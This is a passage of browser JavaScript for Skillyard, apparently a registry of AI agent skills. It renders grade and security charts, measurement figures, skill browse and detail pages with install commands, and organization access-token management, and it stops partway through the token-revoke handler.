function chartGrades(l) {
  const order = ['A', 'B', 'C', 'D', 'F'];
  const max = Math.max(...order.map((g) => l.grades[g] || 0));
  const df = (l.grades.D || 0) + (l.grades.F || 0);
  const body = `<ul class="gd">${order.map((g) => `<li><span class="gchip">${g}</span>${hbar(pc(l.grades[g] || 0, max), 'var(--ink)', 18, `Grade ${g}: ${l.grades[g] || 0} skills`)}<b>${l.grades[g] || 0}</b></li>`).join('')}</ul>
    <p class="gd-sec">Security: <b>${l.secure.clean}</b> clean, <b>${l.secure.low}</b> low, <b>${l.secure.medium}</b> medium, <b>${l.secure.high}</b> high.</p>`;
  return proofFigure({ id: 'pf-lib', cls: 'lib-fig', title: `Grades across ${l.total} public skills`,
    takeaway: `${l.grades.A} get an A. ${df} get a D or F${why(l)}.`,
    body, table: numTable(['Grade', 'Skills'], order.map((g) => [g, l.grades[g] || 0])), source: `skillyard review and skillyard secure, run over the library on ${fmtDate(l.generatedAt)}` });
}

function libCard(j) {
  const ref = j.scope === 'public' ? j.name : j.id;
  return `<li class="lc"><a class="lc-a" href="#/skill/${esc(j.id)}"><span class="lc-t">${esc(j.title)}</span><span class="lc-d">${esc(j.description)}</span></a>
    <div class="lc-m">${judgeChips(j)}<span class="lc-src">${esc(j.scope === 'public' ? 'Skillyard' : j.source.repo || 'community')}${j.source.licence ? ` · ${esc(j.source.licence)}` : ''}</span></div>
    ${cmd(`npx skillyard install ${ref}`)}</li>`;
}

async function librarySection(el) {
  const l = await loadLibrary();
  if (!l) { el.remove(); return; }
  const picks = l.featured.map((id) => l.byId.get(id)).filter(Boolean);
  el.innerHTML = `<div class="x-head"><h2 id="library-h" class="lp-h">${l.total} public skills, graded by our own reviewer.</h2>
      <div class="j-side"><p class="v-lede">${l.scopes.public} written by us, ${l.scopes.community} imported from open-source repositories with their licences kept. Every grade comes from the same review and security code you run locally; none is set by hand.</p></div></div>
    <div class="lib">${chartGrades(l)}
      <div class="lib-picks"><h3 class="lib-h">Worth installing first</h3><ul class="lcs">${picks.map(libCard).join('')}</ul>
      <a class="lp-link" href="#/browse">Browse all ${l.total} with grade and security filters →</a></div></div>`;
  copyButtons(el);
}

// ---- proof charts: inline SVG drawn from web/media/proof.json (real runs; each block names its source) ----------
const GRAY = '#8a8a8a';
const pc = (v, max) => +(v / max * 100).toFixed(2);
function numTable(head, rows) {
  return `<div class="pf-tw"><table><thead><tr>${head.map((x) => `<th scope="col">${esc(x)}</th>`).join('')}</tr></thead><tbody>${rows.map((r) => `<tr>${r.map((c, i) => (i ? `<td>${esc(String(c))}</td>` : `<th scope="row">${esc(String(c))}</th>`)).join('')}</tr>`).join('')}</tbody></table></div>`;
}
function proofFigure({ id, cls = '', title, takeaway, body, table, source }) {
  return `<figure class="pf ${cls}" aria-labelledby="${id}-t" aria-describedby="${id}-k">
    <h3 id="${id}-t" class="pf-t">${title}</h3>
    <p id="${id}-k" class="pf-k">${takeaway}</p>
    ${body}
    <details class="pf-d"><summary>Show the numbers</summary>${table}</details>
    <figcaption class="pf-s">Source: ${esc(source)}</figcaption>
  </figure>`;
}
// A horizontal bar whose left end sits square on the baseline and whose data end is rounded (percent units, so it
// stays crisp at any width).
function hbar(w, fill, h = 14, tip = '') {
  return `<svg class="pf-bar" width="100%" height="${h}" aria-hidden="true" focusable="false"><rect x="0" y="0" width="100%" height="${h}" rx="4" fill="var(--track)"/>${w > 0 ? `<rect x="0" y="0" width="${w}%" height="${h}" rx="4" fill="${fill}"><title>${esc(tip)}</title></rect><rect x="0" y="0" width="${Math.min(w, 1.5)}%" height="${h}" fill="${fill}"/>` : ''}</svg>`;
}

function chartLift(d) {
  const rows = [...d.rows].sort((a, b) => (b.with - b.without) - (a.with - a.without));
  const body = `<div class="pf-legend" aria-hidden="true"><span><i class="dot" style="background:${GRAY}"></i>Without the skill</span><span><i class="dot" style="background:var(--accent)"></i>With the skill</span></div>
    <ol class="db">${rows.map((r) => {
      const up = r.with - r.without;
      return `<li><span class="db-n">${esc(r.skill)}</span><span class="db-v"><span class="a">${r.without}%</span> to <b>${r.with}%</b> <em>${up ? `+${up} pts` : 'no change'}</em></span>
      <svg class="db-svg" width="100%" height="20" aria-hidden="true" focusable="false"><rect x="0" y="9" width="100%" height="2" fill="var(--track)"/>${up ? `<rect x="${r.without}%" y="8" width="${up}%" height="4" fill="var(--accent)" opacity=".3"/>` : ''}<circle cx="${r.without}%" cy="10" r="7" fill="${GRAY}" stroke="var(--panel)" stroke-width="2"><title>${esc(r.skill)} without the skill: ${r.without}%</title></circle><circle cx="${r.with}%" cy="10" r="7" fill="var(--accent)" stroke="var(--panel)" stroke-width="2"><title>${esc(r.skill)} with the skill: ${r.with}%</title></circle></svg></li>`;
    }).join('')}</ol>
    <div class="pf-axis" aria-hidden="true"><span>0%</span><span>50%</span><span>100%</span></div>`;
  return proofFigure({ id: 'pf-lift', cls: 'w7', title: 'Same task, same model, with and without the skill',
    takeaway: 'On three of four tasks the skill raised the score, by up to 90 points. On the fourth the model already scored 100% on its own.',
    body, table: numTable(['Skill', 'Without', 'With', 'Lift'], rows.map((r) => [r.skill, `${r.without}%`, `${r.with}%`, `+${r.with - r.without} pts`])), source: `${d.source}. Graded by fixed checks, no AI judge.` });
}

function chartPrecision(d) {
  const body = `<ol class="gr">${d.skills.map((s, i) => `<li><span class="gr-n">${esc(s)}</span><span class="chip before" aria-label="before: ${d.before[i]}">${d.before[i]}</span><span class="gr-ar" aria-hidden="true">→</span><span class="chip after${d.after[i] === 'A' ? ' a' : ''}" aria-label="after: ${d.after[i]}">${d.after[i]}</span></li>`).join('')}</ol>
    <div class="pf-legend" aria-hidden="true"><span><i class="sq before"></i>Grade before tuning</span><span><i class="sq after"></i>Grade after</span></div>`;
  const as = d.after.filter((g) => g === 'A').length;
  return proofFigure({ id: 'pf-prec', cls: 'w5', title: 'Fewer false alarms from the reviewer',
    takeaway: `Six carefully written skills from another team. The first reviewer graded two of them D and one F. After tuning, ${as} of 6 get an A and none falls below B.`,
    body, table: numTable(['Skill', 'Before', 'After'], d.skills.map((s, i) => [s, d.before[i], d.after[i]])), source: d.source });
}

function chartTokens(d) {
  const segs = [['Cache reads', d.split_m.cache_read, 'var(--accent)'], ['Cache writes', d.split_m.cache_write, 'var(--ink)'], ['Output', d.split_m.output, GRAY], ['Input', d.split_m.input, '#c4c4c4']];
  const share = (v) => (v / d.total_m * 100);
  let x = 0;
  const stack = `<svg class="pf-stack" width="100%" height="44" aria-hidden="true" focusable="false">${segs.map(([n, v, c]) => { const w = share(v); const r = `<rect x="${x.toFixed(2)}%" y="0" width="${w.toFixed(2)}%" height="44" fill="${c}" stroke="var(--panel)" stroke-width="2"><title>${n}: ${v}M tokens (${w.toFixed(1)}%)</title></rect>`; x += w; return r; }).join('')}</svg>`;
  const legend = `<ul class="pf-keys">${segs.map(([n, v, c]) => `<li><i class="sq" style="background:${c}"></i><b>${n}</b><span>${v < 1 ? v.toFixed(2) : v.toFixed(1)}M · ${share(v) < 0.1 ? '<0.1' : share(v) < 1 ? share(v).toFixed(1) : Math.round(share(v))}%</span></li>`).join('')}</ul>`;
  const max = Math.max(...d.daily_m.map((r) => r[1]));
  const min = Math.min(...d.daily_m.map((r) => r[1]));
  const H = 150, base = 126, top = 22, n = d.daily_m.length, slot = 100 / n, bw = slot * 0.62;
  const cols = d.daily_m.map(([day, v], i) => {
    const h = Math.max(2, (v / max) * (base - top)); const y = base - h; const cx = i * slot + slot / 2; const bx = cx - bw / 2;
    const fill = v === max ? 'var(--accent)' : GRAY;
    const lbl = v === max || v === min ? `<text x="${cx.toFixed(2)}%" y="${y - 7}" text-anchor="middle" class="pf-vl">${v}M</text>` : '';
    return `<rect x="${bx.toFixed(2)}%" y="${y}" width="${bw.toFixed(2)}%" height="${h}" rx="4" fill="${fill}"><title>Nov ${day.slice(3)}: ${v}M tokens</title></rect><rect x="${bx.toFixed(2)}%" y="${base - Math.min(4, h)}" width="${bw.toFixed(2)}%" height="${Math.min(4, h)}" fill="${fill}"/>${lbl}<text x="${cx.toFixed(2)}%" y="${H - 6}" text-anchor="middle" class="pf-dl">${Number(day.slice(3))}</text>`;
  }).join('');
  const daily = `<svg class="pf-cols" width="100%" height="${H}" aria-hidden="true" focusable="false"><rect x="0" y="${base}" width="100%" height="2" fill="var(--track)"/>${cols}</svg>`;
  const body = `<div class="tk">
      <div class="tk-main"><p class="tk-big"><b>${Math.round(share(d.split_m.cache_read))}%</b> of ${d.total_m}M tokens were cache reads</p>${stack}${legend}</div>
      <div class="tk-side"><p class="tk-h">Tokens per day, November ${Number(d.daily_m[0][0].slice(3))} to ${Number(d.daily_m[n - 1][0].slice(3))}</p>${daily}</div>
    </div>`;
  return proofFigure({ id: 'pf-tok', cls: 'w12', title: 'Where one developer\'s tokens went in a week',
    takeaway: `Almost everything was the agent re-reading context it had already seen. New input was ${d.split_m.input}M tokens. That is why a map the agent can query, instead of re-opening files, is where the savings are.`,
    body, table: numTable(['Kind or day', 'Tokens (millions)'], [...segs.map(([n, v]) => [n, v]), ...d.daily_m.map(([day, v]) => [`Nov ${Number(day.slice(3))}`, v])]), source: `${d.source}. Measured with skillyard tokens.` });
}

function chartTrace(d) {
  const max = Math.max(...d.bits.map((b) => b[1]));
  const body = `<ul class="tr">${d.bits.map(([name, bits]) => {
    const ai = /AI rewrite/.test(name);
    return `<li class="${ai ? 'ai' : ''}"><span class="tr-n">${esc(name)}</span><span class="tr-v">${bits} bits · ${ai ? 'traced correctly, 1 of 1 rewritten copy' : 'traced correctly 10/10'}</span>${hbar(pc(bits, max), ai ? 'var(--accent)' : GRAY, 14, `${name}: ${bits} bits of evidence`)}</li>`;
  }).join('')}</ul>`;
  return proofFigure({ id: 'pf-trace', cls: 'w7', title: 'Evidence left in a leaked copy, by what was done to it',
    takeaway: 'Each change wipes out some of the marks, but in every case enough was left to name the person the copy was issued to. That includes a copy a real AI model reworded freely.',
    body, table: numTable(['What was done to the copy', 'Evidence (bits)', 'Result'], d.bits.map(([n, b]) => [n, b, /AI rewrite/.test(n) ? 'traced correctly (1 of 1)' : 'traced correctly (10/10)'])), source: `${d.source.split(';')[0]}. The paraphrase row is simulated; the AI rewrite row is one real Claude Haiku rewrite of one copy.` });
}

function chartScan(d) {
  const facts = [[d.ship_scripts, 'ship scripts that can run on your machine'], [d.network_calls, 'make network calls'], [d.fail_format, 'fail the skill format'], [d.confirmed_malicious, 'confirmed malicious']];
  const body = `<p class="sc-big"><b>${d.skills}</b> public skills scanned</p>
    <ul class="sc">${facts.map(([v, t]) => `<li><b>${v}</b><span>${esc(t)}</span><span class="sc-p">${Math.round(v / d.skills * 100)}% of ${d.skills}</span>${hbar(pc(v, d.skills), v ? 'var(--ink)' : GRAY, 8, `${v} of ${d.skills}`)}</li>`).join('')}</ul>`;
  return proofFigure({ id: 'pf-scan', cls: 'w5', title: 'What the most-installed public skills contain',
    takeaway: `We found nothing malicious. But about one in five ships a script, and one in six calls the network, so a skill is code worth checking before it runs.`,
    body, table: numTable(['Finding', 'Skills', `Share of ${d.skills}`], facts.map(([v, t]) => [t, v, `${Math.round(v / d.skills * 100)}%`])), source: d.source });
}

// A summary of the measured week, built only from the numbers in proof.json. It is not `skillyard tokens` output.
function tokensExcerpt(d) {
  const f = (m) => (m >= 1 ? `${m.toFixed(1)}M` : `${(m * 1000).toFixed(1)}k`);
  const peak = d.daily_m.reduce((a, b) => (b[1] > a[1] ? b : a));
  const sessions = (d.source.match(/(\d+) sessions/) || [])[1];
  const s = d.split_m;
  const txt = `Summary of one developer's measured week: ${f(d.total_m)} tokens
${sessions ? `${sessions} sessions · ` : ''}cache reads ${Math.round(s.cache_read / d.total_m * 100)}% of all tokens
input ${f(s.input)} · output ${f(s.output)}
cache wr ${f(s.cache_write)} · cache rd ${f(s.cache_read)}
busiest day ${peak[0]}: ${f(peak[1])}`;
  document.querySelectorAll('[data-live="tokens"]').forEach((x) => { x.textContent = txt; });
}

async function proofCharts(el) {
  try {
    const r = await fetch('media/proof.json');
    if (!r.ok) throw new Error(String(r.status));
    const d = await r.json();
    tokensExcerpt(d.tokens);
    el.innerHTML = chartLift(d.lift) + chartPrecision(d.reviewer_precision) + chartTokens(d.tokens) + chartTrace(d.trace) + chartScan(d.scan);
  } catch {
    document.querySelectorAll('[data-live="tokens"]').forEach((x) => { x.textContent = 'The measured week could not be loaded; see web/media/proof.json.'; });
    el.innerHTML = '<p class="pf-k">The measurements could not be loaded. They are in <a href="https://github.com/agentwik-labs/skillyard/tree/main/reports">the reports folder on GitHub</a>.</p>';
  }
}

function launchVideo() {
  return `<figure class="vid">
      <video id="launch-video" controls muted playsinline preload="metadata" poster="media/skillyard-launch-poster.jpg" aria-describedby="vid-cap">
        <source src="media/skillyard-launch.mp4" type="video/mp4">
        <a href="media/skillyard-launch.mp4">Download the 48-second tour (MP4)</a>
      </video>
      <figcaption id="vid-cap">The 48-second tour, no sound: a skill reviewed, a project secured, and a leaked copy traced back to the person it was issued to.</figcaption>
    </figure>`;
}

async function viewShowcase() {
  const [build, check, improve, save] = JOURNEY;
  const terms = `<div class="v-terms">
        <figure><figcaption>Review, full output (trimmed)</figcaption><pre tabindex="0" aria-label="Output of skillyard review">${esc(TERM_REVIEW)}</pre></figure>
        <figure><figcaption>Secure, full output (trimmed)</figcaption><pre tabindex="0" aria-label="Output of skillyard secure">${esc(TERM_SECURE)}</pre></figure>
      </div>`;
  app.innerHTML = `
  <div class="lp" data-landing data-home>
    ${lpNav()}

    <section class="lp-hero v-hero x-hero" aria-labelledby="hero-h">
      <h1 id="hero-h" class="lp-sentence v-h1 x-h1">Skillyard builds, checks and protects your company's AI skills.</h1>
      <div class="x-side">
        <p class="lp-lede">Skills are the instructions your agents follow. Build them once for every agent, check them, improve them from real use, see what they cost, and keep them yours.</p>
        <div class="v-actions"><a class="lp-action big" href="#/?s=pilot">Join the Pro pilot</a><span class="v-install"><code>npx skillyard review</code></span></div>
      </div>
      ${launchVideo()}
      <ol class="jmap" aria-label="The journey">${[...JOURNEY, PROTECT].map((s) => `<li><a href="#/?s=${s.id}"><b>${s.step}</b><span>${esc(s.h)}</span></a></li>`).join('')}</ol>
    </section>

    ${stepSection(build)}
    ${stepSection(check, terms)}
    ${stepSection(improve)}
    ${stepSection(save)}
    ${protectSection()}

    <section class="v-sec x-proof" id="proof" aria-labelledby="proof-h">
      <div class="x-head"><h2 id="proof-h" class="lp-h">Measured, not claimed.</h2>
      <div class="j-side"><p class="v-lede">The scan, lift, reviewer and trace numbers come from runs you can repeat from the repository. The token week is one developer's own logs, so yours will differ. Small samples are labelled as small.</p></div></div>
      <div class="pf-grid" data-proof><p class="pf-k">Loading the measurements…</p></div>
    </section>

    <section class="v-sec" id="library" aria-labelledby="library-h" data-library><p class="pf-k">Loading the library…</p></section>

    ${roadmapStrip()}
    ${pricingSection()}
    ${pilotCta('su-home')}
    ${lpFooter()}
  </div>`;
  bindSignups(app);
  copyButtons(app);
  // Play the tour on its own only when the visitor has not asked for less motion; controls stay either way.
  const v = document.getElementById('launch-video');
  if (v && !matchMedia('(prefers-reduced-motion: reduce)').matches) { v.loop = true; v.autoplay = true; v.play?.().catch(() => {}); }
  await Promise.all([proofCharts(app.querySelector('[data-proof]')), librarySection(app.querySelector('[data-library]'))]);
}

function viewTeams() {
  app.innerHTML = `
  <div class="lp" data-landing>
    ${lpNav()}
    <section class="lp-hero v-hero">
      <h1 class="lp-sentence v-h1">Skillyard for teams, by request.</h1>
      <p class="lp-lede">The developer tools are free and all of the code is open source. We focus on individual developers first; a shared vault for several people is set up by request. Tell us what you need.</p>
    </section>
    ${protectSection('vault')}
    ${pricingSection('pricing-teams')}
    ${teamsCta('su-teams')}
    ${lpFooter()}
  </div>`;
  bindSignups(app);
  copyButtons(app);
}

async function viewBrowse(params) {
  const q = params.get('q') || '';
  const category = params.get('category') || '';
  const scope = params.get('scope') || '';
  const [stats, { skills }, { orgs }, lib] = await Promise.all([
    api('/api/stats'),
    api(`/api/skills?${new URLSearchParams({ q, category, scope, limit: 300 })}`),
    api('/api/orgs'),
    loadLibrary(),
  ]);
  const grade = lib ? params.get('grade') || '' : '';
  const secure = lib ? params.get('secure') || '' : '';
  if (grade || secure) skills.splice(0, skills.length, ...skills.filter((x) => { const j = lib.byId.get(x.id); return j && (!grade || j.grade === grade) && (!secure || j.secure === secure); }));
  const cardL = (x) => card(x, lib);
  const cats = Object.keys(stats.categories).sort((a, b) => stats.categories[b] - stats.categories[a]);
  const source = params.get('source');
  if (source) skills.splice(0, skills.length, ...skills.filter((x) => (x.source ? x.source.repo.replace('https://github.com/', '') : 'agentwik-labs/skillyard') === source));
  const setParam = (k, v) => { const p = new URLSearchParams(params); v ? p.set(k, v) : p.delete(k); location.hash = `#/browse?${p}`; };
  const mine = !me.anonymous && me.org ? skills.filter((s) => s.scope === me.org) : [];
  const showMine = mine.length && !q && !category && !scope && !params.get('grade') && !params.get('secure');

  app.innerHTML = h`
    <section class="hero">
      <div>
        <h1>Skills your agents can use, from open source and from your own company.</h1>
        <p>Search ready-made Agent Skills, keep your team's private playbooks next to them, and install either into Claude Code, Codex, Cursor or any AGENTS.md agent with one command. Agents can also search and load skills live over MCP.</p>
      </div>
      <div class="stats" aria-label="Registry stats">
        <div><b>${stats.skills}</b><span>Skills</span></div>
        <div><b>${stats.public}</b><span>Open source</span></div>
        <div><b>${me.anonymous ? orgs.length : stats.private}</b><span>${me.anonymous ? 'Publishers' : 'Private to you'}</span></div>
      </div>
    </section>
    <form class="searchbar" id="search" role="search">
      <input name="q" type="search" value="${q}" placeholder="Search skills: code review, deploy, PCI, postmortem…" aria-label="Search skills">
      <select name="scope" aria-label="Publisher" style="max-width:220px">
        <option value="">All publishers</option>
        ${raw(orgs.map((o) => `<option value="${esc(o.slug)}" ${o.slug === scope ? 'selected' : ''}>@${esc(o.slug)} (${o.skillCount})</option>`).join(''))}
      </select>
      ${raw(lib ? `<select name="grade" aria-label="Grade" style="max-width:150px"><option value="">Any grade</option>${['A', 'B', 'C', 'D', 'F'].map((g) => `<option value="${g}" ${g === grade ? 'selected' : ''}>Grade ${g} (${lib.grades[g]})</option>`).join('')}</select>
      <select name="secure" aria-label="Security" style="max-width:190px"><option value="">Any security result</option>${['clean', 'low', 'medium', 'high'].map((k) => `<option value="${k}" ${k === secure ? 'selected' : ''}>${k === 'clean' ? 'Clean' : `${k[0].toUpperCase()}${k.slice(1)} risk`} (${lib.secure[k]})</option>`).join('')}</select>` : '')}
      <button class="primary" type="submit">Search</button>
    </form>
    ${raw(lib ? `<p class="muted judge-note">Grades and security results come from <code>skillyard review</code> and <code>skillyard secure</code>, run over every public skill. Private company skills are not graded here.</p>` : '')}
    <div class="chips" role="group" aria-label="Categories">
      <button type="button" class="chip ${category ? '' : 'on'}" data-cat="">All</button>
      ${raw(cats.map((c) => `<button type="button" class="chip ${c === category ? 'on' : ''}" data-cat="${esc(c)}">${esc(CATEGORY_LABELS[c] || c)} · ${stats.categories[c]}</button>`).join(''))}
    </div>
    ${raw(showMine ? h`<div class="section-title"><h2>Your organization · @${me.org}</h2><a href="#/orgs/${me.org}" class="muted">Manage</a></div><div class="grid">${raw(mine.map(cardL).join(''))}</div>` : '')}
    <div class="section-title"><h2>${source ? `From ${source} · ${skills.length}` : q || category || scope ? `${skills.length} result${skills.length === 1 ? '' : 's'}` : 'All skills'}</h2>
      ${raw(me.anonymous ? '<span class="muted">Sign in with an org token to see private skills</span>' : '')}</div>
    ${raw(skills.length ? `<div class="grid">${skills.filter((s) => !showMine || s.scope !== me.org).map(cardL).join('')}</div>` : '<div class="empty">No skills match. Try fewer words.</div>')}
  `;
  document.getElementById('search').addEventListener('submit', (e) => {
    e.preventDefault();
    const fd = new FormData(e.target);
    const p = new URLSearchParams(params);
    for (const k of ['q', 'scope', 'grade', 'secure']) fd.get(k) ? p.set(k, fd.get(k)) : p.delete(k);
    location.hash = `#/browse?${p}`;
  });
  app.querySelectorAll('[data-cat]').forEach((b) => b.addEventListener('click', () => setParam('category', b.dataset.cat)));
}

const INSTALL_TABS = [
  ['claude', 'Claude Code'], ['codex', 'Codex'], ['cursor', 'Cursor'], ['agents', 'AGENTS.md'], ['all', 'All agents'],
];

function judgePanel(j) {
  const n = j.findings.high + j.findings.medium + j.findings.low;
  const sn = j.secureFindings.high + j.secureFindings.medium + j.secureFindings.low;
  const li = (f) => `<li title="${esc(f.rule)}"><span class="sev ${f.severity}">${f.severity}</span> ${esc(f.file)}:${f.line} <span class="muted">${esc(f.message)}</span></li>`;
  return `<div class="panel judge-panel">
    <h3>Skillyard's judgement</h3>
    <p class="jp-grade">${judgeChips(j)}<span>${j.score}/100 · ~${j.tokens} tokens</span></p>
    <img class="jp-badge" src="media/badges/${esc(j.id.split('/')[0].slice(1))}/${esc(j.name)}.svg" alt="Skillyard badge: grade ${esc(j.grade)}, ${j.secure === 'clean' || j.secure === 'low' ? 'secure' : 'security findings'}" onerror="this.remove()">
    <p class="jp-line"><b>Review:</b> ${n ? `${n} finding${n === 1 ? '' : 's'} (${j.findings.high} high, ${j.findings.medium} medium, ${j.findings.low} low)` : 'no findings'}</p>
    ${j.top.length ? `<ul class="files">${j.top.map(li).join('')}</ul>` : ''}
    <p class="jp-line"><b>Security:</b> ${esc(SECURE_LABEL[j.secure])}${sn ? ` (${j.secureFindings.high} high, ${j.secureFindings.medium} medium, ${j.secureFindings.low} low)` : ''}</p>
    ${j.secureTop.length ? `<ul class="files">${j.secureTop.map(li).join('')}</ul>` : ''}
    <p class="muted" style="font-size:13px;margin:8px 0 0">Run it yourself: <code>skillyard review</code> and <code>skillyard secure</code> on the skill folder.</p>
  </div>`;
}

async function viewSkill(id, filePath) {
  const [s, lib] = await Promise.all([api(`/api/skills/${id}`), loadLibrary()]);
  const j = lib?.byId.get(s.id);
  const base = `#/skill/${s.id}/file/`;
  let main;
  if (filePath) {
    const text = await api(`/api/skills/${s.id}/files/${filePath.split('/').map(encodeURIComponent).join('/')}`, { raw: true });
    main = filePath.endsWith('.md')
      ? `<article class="md">${markdown(text, base + filePath.replace(/[^/]+$/, ''))}</article>`
      : `<article class="md"><pre><code>${esc(text)}</code></pre></article>`;
  } else {
    const { fm, body } = splitFrontmatter(s.skillMd);
    main = `<article class="md">${fm ? `<div class="frontmatter">${esc(fm)}</div>` : ''}${markdown(body, base)}</article>`;
  }
  const ref = installRef(s);
  app.innerHTML = h`
    <div class="crumbs"><a href="#/browse">Skills</a> / <a href="#/orgs/${s.scope}">@${s.scope}</a> / ${s.name}${raw(filePath ? ` / <span class="mono">${esc(filePath)}</span>` : '')}</div>
    <div class="detail">
      <div>
        <div class="meta" style="margin-bottom:8px"><span class="badge ${s.visibility}">${s.visibility}</span><span class="tag">${CATEGORY_LABELS[s.category] || s.category}</span>${raw(s.tags.map((t) => `<span class="tag">${esc(t)}</span>`).join(''))}</div>
        <h1>${s.title}</h1>
        <p class="lede">${s.summary}</p>
        ${raw(main)}
      </div>
      <aside>
        ${raw(j ? judgePanel(j) : '')}
        <div class="panel">
          <h3>Install</h3>
          <div class="tabs" role="tablist">${raw(INSTALL_TABS.map(([k, l], i) => `<button type="button" role="tab" data-tab="${k}" class="${i === 0 ? 'on' : ''}">${l}</button>`).join(''))}</div>
          <div id="install-cmd">${raw(cmd(`npx skillyard install ${ref} --agent claude`))}</div>
          <p class="muted" style="font-size:13px;margin:10px 0 0">Add <code>-g</code> to install for every project, <code>--save</code> to record it in <code>skills.json</code>.${raw(s.visibility === 'private' ? ' Private: run <code>skillyard login --token …</code> first.' : '')}</p>
        </div>
        <div class="panel">
          <h3>Use over MCP</h3>
          <p class="muted" style="font-size:13px;margin:0 0 8px">Connected agents call <code>get_skill</code> with:</p>
          ${raw(cmd(s.id))}
          <p style="font-size:13px;margin:10px 0 0"><a href="#/connect">Connect an agent →</a></p>
        </div>
        ${raw(j ? '' : `<div class="panel">
          <h3>Security scan</h3>
          ${!s.scan ? '<p class="muted" style="margin:0;font-size:13px">Not scanned.</p>'
            : !s.scan.findings.length ? '<p style="margin:0;font-size:14px"><span class="badge public">Passed</span> No risky patterns in instructions or scripts.</p>'
            : `<p style="margin:0 0 8px;font-size:14px"><span class="badge private">${s.scan.warning} to review</span> No blocking issues.</p><ul class="files">${s.scan.findings.map((f) => `<li title="${esc(f.rule)}">${esc(f.file)}:${f.line} <span class="muted">${esc(f.message)}</span></li>`).join('')}</ul>`}
        </div>`)}
        <div class="panel">
          <h3>Files</h3>
          <ul class="files">${raw(s.files.map((f) => `<li><a href="${f === 'SKILL.md' ? `#/skill/${esc(s.id)}` : base + esc(f)}">${esc(f)}</a></li>`).join(''))}</ul>
        </div>
        <div class="panel">
          <h3>Details</h3>
          <dl class="kv">
            <dt>Version</dt><dd>${s.version}${raw(s.versions.length > 1 ? ` <span class="muted">(${s.versions.length} versions)</span>` : '')}</dd>
            <dt>Publisher</dt><dd><a href="#/orgs/${s.scope}">@${s.scope}</a></dd>
            <dt>Author</dt><dd>${s.author || '—'}</dd>
            ${raw(s.source ? h`<dt>Source</dt><dd><a href="${s.source.repo}/tree/${s.source.commit}/${s.source.path}" target="_blank" rel="noopener noreferrer">${s.source.repo.replace('https://github.com/', '')}</a> <span class="muted mono" style="font-size:11.5px">${s.source.commit.slice(0, 7)}</span></dd>` : '')}
            <dt>License</dt><dd>${s.license || '—'}</dd>
            <dt>Updated</dt><dd>${fmtDate(s.publishedAt)}</dd>
            <dt>Checksum</dt><dd class="mono" style="word-break:break-all;font-size:11.5px">${s.checksum.slice(0, 23)}…</dd>
          </dl>
        </div>
      </aside>
    </div>`;
  app.querySelectorAll('[data-tab]').forEach((b) => b.addEventListener('click', () => {
    app.querySelectorAll('[data-tab]').forEach((x) => x.classList.toggle('on', x === b));
    document.getElementById('install-cmd').innerHTML = cmd(`npx skillyard install ${ref} --agent ${b.dataset.tab}`);
    copyButtons(document.getElementById('install-cmd'));
  }));
  copyButtons(app);
}

async function viewOrgs() {
  const { orgs } = await api('/api/orgs');
  app.innerHTML = h`
    <div class="page-head"><h1>Organizations</h1><p>Every skill belongs to a publisher. Community skills live under <code>@skillyard</code>; companies publish under their own scope and choose, per skill, whether it is public or private to their tokens.</p></div>
    <table class="list"><thead><tr><th>Publisher</th><th>About</th><th>Skills</th></tr></thead><tbody>
      ${raw(orgs.map((o) => h`<tr><td><a href="#/orgs/${o.slug}"><strong>@${o.slug}</strong></a><div class="muted" style="font-size:13px">${o.name}</div></td><td>${o.description}</td><td>${o.skillCount}${raw(o.privateCount ? ` <span class="badge private">${o.privateCount} private</span>` : '')}</td></tr>`).join(''))}
    </tbody></table>`;
}

async function viewOrg(slug) {
  const org = await api(`/api/orgs/${slug}`);
  const canManage = !STATIC && (me.admin || (me.org === slug && me.scopes?.includes('publish')));
  app.innerHTML = h`
    <div class="crumbs"><a href="#/orgs">Organizations</a> / @${org.slug}</div>
    <div class="page-head"><h1>${org.name}</h1><p>${org.description}${raw(org.website ? ` · <a href="${esc(org.website)}" rel="noopener noreferrer" target="_blank">${esc(org.website.replace(/^https?:\/\//, ''))}</a>` : '')}</p></div>
    ${raw(!org.member && slug !== 'skillyard' ? '<div class="notice">You are seeing this organization\'s public skills. Members sign in with an org token to see private ones.</div>' : '')}
    <div class="section-title"><h2>Skills · ${org.skills.length}</h2></div>
    ${raw(org.skills.length ? `<div class="grid">${org.skills.map(card).join('')}</div>` : '<div class="empty">No skills visible yet.</div>')}
    ${raw(canManage ? '<div id="manage"></div>' : '')}`;
  if (canManage) renderManage(slug);
}

async function renderManage(slug) {
  const el = document.getElementById('manage');
  const [{ tokens }, { events }] = await Promise.all([api(`/api/orgs/${slug}/tokens`), api(`/api/orgs/${slug}/events`)]);
  el.innerHTML = h`
    <div class="section-title"><h2>Access tokens</h2></div>
    <p class="muted" style="margin-top:-6px">Give each teammate or CI job its own read token; give publish tokens only to maintainers. Tokens are shown once.</p>
    <form id="new-token" class="row" style="margin-bottom:12px">
      <input name="name" placeholder="Name, e.g. laptop-dana or ci" required style="max-width:280px">
      <select name="scopes" style="max-width:200px"><option value="read">read</option><option value="read,publish">read + publish</option></select>
      <button class="primary">Create token</button>
    </form>
    <div id="token-out"></div>
    <table class="list"><thead><tr><th>Name</th><th>Scopes</th><th>Created</th><th>Last used</th><th></th></tr></thead><tbody>
      ${raw(tokens.map((t) => h`<tr><td>${t.name} <span class="muted mono">${t.id}</span></td><td>${t.scopes.join(', ')}</td><td>${fmtDate(t.createdAt)}</td><td>${t.lastUsedAt ? fmtDate(t.lastUsedAt) : 'never'}</td><td><button type="button" class="ghost" data-revoke="${t.id}">Revoke</button></td></tr>`).join(''))}
    </tbody></table>
    <div class="section-title"><h2>Activity</h2></div>
    ${raw(events.length ? `<table class="list"><tbody>${events.slice(0, 30).map((e) => h`<tr><td class="muted">${new Date(e.at).toLocaleString()}</td><td>${e.type}</td><td class="mono">${e.skill ? `${e.skill}${e.version ? `@${e.version}` : ''}` : e.tokenId || ''}</td></tr>`).join('')}</tbody></table>` : '<div class="empty">No activity yet.</div>')}`;
  document.getElementById('new-token').addEventListener('submit', async (e) => {
    e.preventDefault();
    const fd = new FormData(e.target);
    try {
      const t = await api(`/api/orgs/${slug}/tokens`, { method: 'POST', body: { name: fd.get('name'), scopes: fd.get('scopes').split(',') } });
      await renderManage(slug);
      document.getElementById('token-out').innerHTML = `<div class="notice">New token for <strong>${esc(t.name)}</strong> — copy it now, it won't be shown again:${cmd(t.token)}</div>`;
      copyButtons(document.getElementById('token-out'));
    } catch (err) { alertInline(el, err.message); }
  });
  el.querySelectorAll('[data-revoke]').forEach((b) => b.addEventListener('click', async () => {
    b.disabled = true;
